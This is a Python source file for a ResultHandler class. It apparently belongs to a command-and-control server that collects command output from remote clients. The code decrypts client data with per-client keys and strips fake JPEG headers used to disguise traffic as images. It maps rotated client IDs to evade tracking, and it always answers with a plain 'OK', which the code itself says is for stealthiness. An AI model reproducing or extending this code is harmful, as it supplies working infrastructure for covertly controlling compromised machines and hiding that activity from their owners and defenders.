import json
import logging
import base64
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class ResultHandler(BaseHandler):
    """Handler for command result data from clients"""
    
    def handle(self):
        """Process command result data from client"""
        # Get content data
        self.log_message(f"ResultHandler received request from {self.client_address[0]}")
        
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.log_message(f"Missing content from {self.client_address[0]}")
            self.send_error_response(400, "Missing content")
            return
            
        self.log_message(f"Reading {content_length} bytes of result data")
        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse the request body JSON
            body_data = json.loads(request_body)
            
            # Extract client ID and data from the request body
            client_id = body_data.get('client_id')
            encrypted_data = body_data.get('data')
            
            if not client_id:
                self.log_message(f"No client ID provided in request from {self.client_address[0]}")
                self.send_error_response(400, "Missing client ID")
                return
                
            self.log_message(f"Identified client from result: {client_id}")
            
            # Find the original client ID if this is a rotated ID
            original_client_id = self.client_manager.get_original_client_id(client_id)
            if original_client_id != client_id:
                self.log_message(f"Mapped rotated client ID {client_id} to original ID {original_client_id}")
                client_id = original_client_id
            
            # Process the result
            try:
                result_data = None
                is_structured = False
                timestamp = None
                result = None
                
                # Try to decrypt the data
                try:
                    # Check for JPEG header in binary format before trying to decrypt
                    if encrypted_data and isinstance(encrypted_data, str):
                        # Try to decode as base64 first
                        try:
                            decoded_data = base64.b64decode(encrypted_data)
                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
                                # Remove the JPEG header (first 3 bytes)
                                decoded_data = decoded_data[3:]
                                self.log_message(f"Removed binary JPEG header from result data")
                                
                                # Re-encode to base64 for decryption
                                encrypted_data = base64.b64encode(decoded_data).decode('utf-8')
                        except Exception as e:
                            # If not valid base64 or no JPEG header, check for text-based headers
                            if encrypted_data.startswith("0xFFD8FF"):
                                encrypted_data = encrypted_data[8:]  # Remove the exact 8 characters
                                self.log_message(f"Removed text JPEG header '0xFFD8FF' from result data")
                            elif encrypted_data.startswith("FFD8FF"):
                                encrypted_data = encrypted_data[6:]  # Remove the exact 6 characters
                                self.log_message(f"Removed text JPEG header 'FFD8FF' from result data")
                    
                    # Decrypt using client's key if available
                    if encrypted_data and self.crypto_helper._has_unique_key(client_id):
                        result_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                    elif encrypted_data:
                        result_data = self.crypto_helper.decrypt(encrypted_data)
                    else:
                        result_data = "No data provided"
                        
                    self.log_message(f"Successfully decrypted result data: {result_data[:100]}...")
                except Exception as e:
                    self.log_message(f"Decryption failed, using data as-is: {str(e)}")
                    result_data = encrypted_data
                
                # Try to parse as JSON
                try:
                    if result_data:
                        result_json = json.loads(result_data)
                        if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                            # This is a structured result
                            is_structured = True
                            timestamp = result_json['timestamp']
                            result = result_json['result']
                            
                            # Also check for rotated client ID in the result
                            if 'client_id' in result_json and result_json['client_id'] != client_id:
                                received_client_id = result_json['client_id']
                                self.log_message(f"Client reported ID {received_client_id} in result differs from tracked ID {client_id}")
                                
                                # Update mapping if this is a newly rotated ID
                                current_id = self.client_manager.get_current_client_id(client_id)
                                if current_id != received_client_id:
                                    self.log_message(f"Updating client ID mapping from {current_id} to {received_client_id}")
                                    self.client_manager.update_client_id_mapping(client_id, received_client_id)
                except json.JSONDecodeError:
                    # Not JSON, use as raw result
                    self.log_message(f"Data is not valid JSON, using as raw result")
                    result = result_data
                
                # Process structured result if parsed successfully
                if is_structured and timestamp and result:
                    self.log_message(f"Processing structured result for timestamp {timestamp}")
                    
                    # Check if this is a result for a client_id_rotation command
                    # Find the original command to check its type
                    original_command_type = None
                    if client_id in self.client_manager.clients:
                        for cmd in self.client_manager.clients[client_id]["history"]:
                            if cmd.get("timestamp") == timestamp:
                                original_command_type = cmd.get("command_type")
                                break
                    
                    # If this was a rotation command that succeeded, clear the rotation_commands_sent counter
                    if original_command_type == "client_id_rotation" and "success" in result.lower():
                        if client_id in self.client_manager.clients:
                            # Reset the counter for successful rotations
                            self.client_manager.clients[client_id]['rotation_commands_sent'] = 0
                            self.log_message(f"Client ID rotation successfully applied for {client_id}")
                    
                    # Add the result to the command history
                    success = self.client_manager.add_command_result(client_id, timestamp, result)
                    self.log_message(f"Result processed for client {client_id} (timestamp: {timestamp}), success: {success}")
                    
                    # Remove the command from pending queue since we have the result
                    self._remove_from_pending(client_id, timestamp)
                else:
                    # Handle unstructured result or fallbacks
                    self._handle_unstructured_result(client_id, result_data)
                
                # Send success response - simplified to just a standard "OK" for stealthiness
                self.send_success_response()
                
            except Exception as e:
                logger.error(f"Error processing command result: {e}")
                # Still send a success response to prevent client from retrying endlessly
                self.send_success_response()
                
        except json.JSONDecodeError:
            self.log_message(f"Invalid JSON in request body from {self.client_address[0]}")
            self.send_error_response(400, "Invalid JSON format")
    
    def _remove_from_pending(self, client_id, timestamp):
        """Remove a command from pending once its result is received"""
        if client_id in self.client_manager.get_clients_info():
            pending_commands = self.client_manager.get_pending_commands(client_id)
            # Find and remove the command with matching timestamp
            for i, cmd in enumerate(pending_commands):
                if cmd.get("timestamp") == timestamp:
                    # Remove this specific command from pending
                    self.log_message(f"Removing completed command with timestamp {timestamp} from pending for client {client_id}")
                    self.client_manager.clear_pending_commands(client_id)
                    
                    # Re-add any other pending commands that weren't completed
                    for j, other_cmd in enumerate(pending_commands):
                        if j != i:
                            self.client_manager.add_command(
                                client_id,
                                other_cmd.get("command_type", "unknown"),
                                other_cmd.get("args", "")
                            )
                    break
    
    def _handle_unstructured_result(self, client_id, result_data):
        """Handle unstructured (non-JSON) command results"""
        self.log_message(f"Unstructured result received from {client_id}")
        self.client_manager.log_event(client_id, "Command Result Received", result_data)